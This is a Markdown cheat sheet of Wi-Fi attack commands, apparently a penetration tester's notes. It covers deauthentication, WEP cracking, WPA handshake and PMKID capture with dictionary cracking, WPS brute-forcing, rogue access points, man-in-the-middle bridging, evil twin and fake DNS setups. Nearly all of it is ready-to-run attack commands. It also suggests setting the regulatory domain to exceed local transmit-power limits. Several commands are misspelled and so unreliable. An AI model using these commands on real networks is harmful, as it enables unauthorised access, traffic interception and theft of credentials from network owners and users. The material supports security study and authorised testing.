# WIFI Security

## Environment Setup

```
# Check if system is using mac80211 drivers
$ lsmod | grep mac80211


# Details about wireless device
$ iwconfig
$ iw list


# Change WiFi channel
$ iwconfig wlan0 channel 11
$ iw dev wlan0 set channel 11


# Increase Maximum Transit Power of a Wireless Adapter
$ iw reg set BO                               # Set to Bolivia
$ iw dev wlan0 set txpower fixed 30dbm        # Set power to 30dbm
$ iwconfig wlan0                              # Check



# Set-Up Monitor Mode Interface on wlan0
$ airmon-ng start wlan0
$ airmon-ng stop wlan0
$ iwconfig mon0                             


# Kill programs which block wireless interface and forbid changing parameters
$ airmon-ng check kill



# Check if everything is working fine
$ aireplay-ng -9 mon0


```



## Wireless Standards and Networks

```
# IEEE 802.11 starnarts
	802.11 (Legacy)     -    2.4 GHz
	802.11a             -    5 GHz 
	802.11b             -    2.4 GHz 
	802.11g             -    2.4 GHz 
	802.11n             -    2.4/5 GHz 


# Type of Wireless Networks
	Infrastructure Network
	Ad-Hoc Network


# Authentication Modes
	Open Authentication
	Shared Key Authentication (SKA)

```


## Discover Wi-Fi Networks

**Tools**
```
# InSSIDer - Windows
# https://www.metageek.com/


-------------------------------------------------------------------------------


# Kismet - Linux
# https://www.kismetwireless.net/

$ kismet -c <mon_interface>                          # Start sniffing


-------------------------------------------------------------------------------

# Airodump-ng  - Linux

$ airodump-ng <mon_interface>
$ airodump-ng -c 1,6,11 <mon_interface>           # Listen only 1,6,11 Channels
$ airodump-ng -w <filename> <mon_interface>       # Capture to .cap file
$ airodump-ng  -c <chanell> --bssid <BSSID> <mon_interface>
$ airodump-ng -t wep <mon_interface>              # Capture only WEP network


```

**Hidden Networks**
```
# Wireshark - Beacom Frames
wlan[0]== 0x80

# Wireshark - Probe Responses
wlan.fc.type_subtype == 0x05

-------------------------------------------------------------------------------

$ kismet -c <mon_interface>                    # Capture Networks

# Send Deauth packets to get Hidden network SSID through Probe Responses
$ aireplay-ng -0 <num> -c <client_mac> -a <BSSID> <mon_interface>

# Check on kismet Hidden network SSID or filter Wireshark as follow
wlan.fc.type_subtype == 0x05


```


## Traffic Analysis/Decrypt

```
# Capture Frames to .cap file
$ airodump-ng -w <outputfile> <mon_interface>

wlan.fc.type_subtype != 0x08               # Filter Frames except Beacon frames
wlan.bssid == <BSSID>                      # Filter by AP MAC address
wlan.fc.type_subtype == 0x02               # Get Data Frames
wlan.fc.type_subtype == 8                  # Get Network SSID


-------------------------------------------------------------------------------



# Traffic Decryption - Wireshark
> Edit > Preferences > Protocols > IEEE 802.11 > Edit Decryption Keys
> WEP - Hexademical Key
> WPA - Key:SSID


# Traffic Decryption - Airdecap-ng 
$ airdecap-mg -w <wep_key_in_hex> <.cap>                   # Decrypt WEP
$ airdecap-mg -p <wpa_passphrase> -e <SSID> <.cap>         # Decrypt WPA


# Maintian IEEE 802.11 flags after decryption
$ airdecap-mg -w <wep_key_in_hex> <.cap> -1                 # Decrypt WEP



NOTE: Only traffic that was captured after the handshake can be decrypted

NOTE: Take attention to get 4 way handshake





-------------------------------------------------------------------------------

# Setup
1. airmon-ng check kill
2. airmon-ng start wlan0
3. airodump-ng wlan0mon -c <channel> --bssid <BSSID> -w <filename>
4. aireplay-ng -0 <num>  -c <client_mac> -a <BSSID> wlan0mon
5. airdecap-mg -p <wpa_passphrase> -e <SSID> <filename.cap>
6. Open in Wireshark

```



## Attacking Wi-Fi Networks

#### WEP

 **Increment the packet rate of  `#Data` and `#/s`/s Columns on Airodump-ng**
```
$ airodump-ng wlan0mon -c <channel> --bssid <BSSID> -w <filename>   # Listen


1. Deauthentication Attack
2. ARP Replay Attack

```

**ARP Replay - Fake Authentication -  Increment the packet rate** 
```
$ aireplay-ng -1 <delay_between_authentication> -a <bssid> -e <essid> <intf>
$ aireplay-ng -1 15 -a <bssid> -e <essid> <intf>
```

**ARP Replay - Troubleshooting/Picky AP - Increment the packet rate** 
```
$ aireplay-ng -1 6000 -q 10 -o 1 -a <bssid> -e <essid> <intf>
	-q = Keep-Alive Packets
	-o = Send one set of packets at atime
```

**Listen for ARP requests send by clients to the network**
```
$ aireplay-ng -3 -b <bssid> <intf>
```

---
---
---


**WEP Cracking with `aircrack-ng`**
```
$ aircrack-ng -n <key_lenght> <.cap file(s)>
$ aircrack-ng -e <ssid> <.cap file(s)>

```



**Clientless WEP cracking**
```
1. Capture data
$ airodump-ng wlan0mon -c <channel> --bssid <BSSID> -w <filename> 


2. Authenticating to the AP - Fake Authentication
$ aireplay-ng -1 6000 -q 10 -a <bssid> <interface>


3. Aireplay-ng Fragmentation Attack
$ aireplay-ng -5 -b <bssid> -c <source_mac> <interface> 
	-5 = indicates the fragmentation attack
	-c = attacker wireless adapter MAC


4. Build ARP request packet with captured PRGA
$ packetforge-ng -0 -a <bssid> -h <attacker_mac> -k <ip1> -l <ip2> -y <prga.xor> -w outfile
$ packetforge-ng -0 -a <bssid> -h <attacker_mac> -k 255.255.255.255 -l 255.255.255.255 -y <prga.xor> -w packet_file


5. Inject the forged ARP requests
$ aireplay-ng -2 -r <packet_file> <interface>



6. If everything works fine airodump-ng will generate new traffic and gather IV. Then use aircrack-ng as previously seen.
```




**Bypassing Shared key Authetication**
```
1. Capture data
$ airodump-ng wlan0mon -c <channel> --bssid <BSSID> -w <filename> 


2. Send Deauth frames
$ aireplay-ng -0 <num> -c <client_mac> -a <BSSID> <mon_interface>

3. On airodump-ng windows, "keystream" message should be visible, which is saved to .xor file.

4. Fake authentication attack
$ aireplay-ng -1 6000 -q 10 -e <ssid> -y <file.xor> <interface>

5. ARP replay attack
$ aireplay-ng -3 -b <bssid> <intf>

```




**Attacking the client - Caffe-Latte attack**
```
# Assume that Conditions :
	- Target network AP is switched off or out of range
	- A Client with a pre-configured WEP Key for the targer network
	- Another device that use as an attack point


1. Capture data
$ airodump-ng wlan0mon -c <channel> -w <filename> 

2. Caffe-Late attack
$ airbase-ng -c <channel> -W 1 -L -e <SSID> <interface>
	-L = enable Cafe-Latte attack
	-e = act as an AP for the specified SSID
	-c = fixes channel
	-W = force airbase-ng to net set the WEP Privacy bit in beacon

3. Wait to get sufficient amount of packets, then use aircrack-ng 
```


---
---
---




#### WPA/WPA2

**Capture the Handshake**
```
# Capture Packets/Handshake
$ airodump-ng wlan0mon -c <channel> --bssid <BSSID> -w <filename>


# Deauthenticate client 
$ aireplay-ng -0 <num> -c <client_mac> -a <BSSID> <mon_interface>


# Crack Handshake - Aircrack-ng
$ aircrack-ng -w <wordlist(s)> <.cap file>            # Dictionary Attack
$ aircrack-ng -S                                      # Benchmark

```


**Capture PMKID**

```
# install hcxdumptool
git clone https://github.com/ZerBea/hcxdumptool
cd hcxdumptool/
make
sudo make install
cd .. # up

# install hcxtools
sudo apt install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev
git clone https://github.com/ZerBea/hcxtools
cd hcxtools /
make
sudo make install
cd ..


-------------------------------------------------------------------------------

# Capture PMKID
$ ./hcxdumptool -i <interface> --rds=1 -w <captured.pcapng>

# Convert pcapng to Hashcat format
$ ./hcxpcapngtool -o hash.22000 <captured.pcapng>
> https://hashcat.net/cap2hashcat/

# Verify Hash SSIDs
$ ./hcxhashtool -i <hash.22000> -E stdout

# Crack with hashcat
$ hashcat -m 22000 hash.2200 <wordlist>

```


**Crunch**
```
$ crunch <min_lenght> <max_lenght> -o my_wordlist.lst

$ crunch 8 8 | aircrack-ng -e <SSID> <.cap file> -w -

```


**Hashcat**
```
# Convert .cap file to .hccapx
- https://hashcat.net/cap2hashcat/
- hcxpcapngtool -o hash.22000 <captured.pcapng>


# Crack with Hashcat
$ hashcat -m 22000 <hash.22000> <wordlist>



NOTE : oclhashcat is used for AMD/ATI GPUs, cudahashcat is used for NVIDIA GPUs

```


**Hashcat as a service**
```
https://www.onlinehashcrack.com/
```


**Pyrit**
```
$ pyrit eval                                        # Check database status
$ pyrit -i <wordlist_file> import_passwords         # Import Passwords
$ pyrit -e <SSID> create_essid                      # Provied SSID
$ pyrit eval                                        # Check Database status
$ pyrit batch                                       # Start Building Database
$ pyrit -r <.cap file> attack_db                    # Attack/Crack




# Pre Build Databases with 1000 frequently used SSIDs
https://www.renderlab.net/projects/WPA-tables/
```


---
---
---


## WPS

```
# List of WPS enabled APs
wash -i <interface>


# Crack WPS - Bully
$ bully -b <BSSID> -c <channel> <interface>
$ bully -b <BSSID> -c <channel> -1 <sec> -2 <sec> <interface>
$ bully -b <BSSID> -c <channel> -1 60 -2 60 <interface>          # Delay
$ bully <interface> -b <BSSID> -c <channel> -S -F -B -v 3        # Hacktricks


# Crack WPS - Reaver
$ reaver -i <interface> -b <BSSID> -c <channel> -vv
$ reaver -i <interface> -b <BSSID> -c <channel> -vv -d 60        # Delay
$ reaver -i <interface> -b <BSSID> -c <channel> -b -f -N [-L -d 2] -vvroot  # Hacktricks

```



---
---
---



## Wi-Fi as Attack Vectors


**WEP - Rouge AP / Recover Keystream**
```
# Putting Wireless Adapter into Monitor Mode
$ airmon-ng start <intf>


# Capture packets / Dump the incoming keystreams to a file
$ airodump-ng  -c <channel> -w <outfile> <mon_interface>


# Spoof SSID
$ airbase-ng -c <channel> -e <SSID> -s -W 1 <intf>
	-s = force shared key authentication
	-W = set WEP flag in beacons


# When client connects to our Rouge AP, we recieve Keystreams stored in .xor file.
```


**WPA/WPA2 - Rogue AP / Capture Handshake**
```
# Putting Wireless Adapter into Monitor Mode
$ airmon-ng start <intf>


# Capture Packets/Handshake
$ airodump-ng  -c <channel> -w <outfile> <mon_interface>


# Spoof SSID
$ airbase-ng -c <channel> -e <SSID> -W 1 -Z 4 <intf>
	-W = set WEP flag in beacons
	-Z = Set WPA2 with CCMP encryption



# When client tricked to connect our Rouge AP, we recieve Handshake stored in .cap file.

```



**Man in the Middle Attack**

```
# Put Wirekess interface to Monitor mode
$ airmon-ng start <intf>


# Start/Set-up Access Point
$ airbase-ng -c <channel> -e "Free Internet" <intf>


# Create a Network Bridge Interface
$ apt-get install bridge-utils                  # brctl: Command not found
$ brctl addbr br0
$ brctl addif br0 eth0
$ brctl addif br0 at0

> br0  = bridge interface
> eth0 = attacker wired interface
> at0  = virtual interface created by airbase-ng


# Assign IP Address to bridged interface
{
$ ifconfig eth0 0.0.0.0 up
$ ifconfig at0 0.0.0.0 up
}
$ ifconfig br0 <ip_address> up


# Enable Port-Forwarding
$ echo 1 > /proc/sys/net/ipv4/ip_forward


# Capture Packets/Data
> Wireshark
> Tcpdump
  tcpdump -nvi <intf> tcp port 80 -A

```


**Evil Twins Attack**

```
# https://github.com/sensepost/mana

$ apt install mana-toolkit                   # Linux Install
$ /usr/share/mana-toolkit/run-mana/          # Mana Scripts
$ /etc/mana-toolkit/hostapd-mana.conf        # Configuration File
$ /usr/share/mana-toolkit/www/portal         # Location of Landing Page


-----------------------------------------

# Metasploit - Fake DNS
msf > use auxiliary/server/fakedns
msf > SET TARGETACTION FAKE
msf > SET TARGETDOMAIN *
msf > SET 10.0.0.1
msf > exploit -j

-----------------------------------------




NOTE : Upon Deauthentication of the client, the client should auto-reconnect to the AP with the stronger signal ( The attacker controlled AP )
```


**WPA2-Enterprise**
```
# https://github.com/s0lst1c3/eaphammer

```


**Wardriving**
```
# https://play.google.com/store/apps/details?id=net.wigle.wigleandroid&hl=en

# https://wigle.net/
```
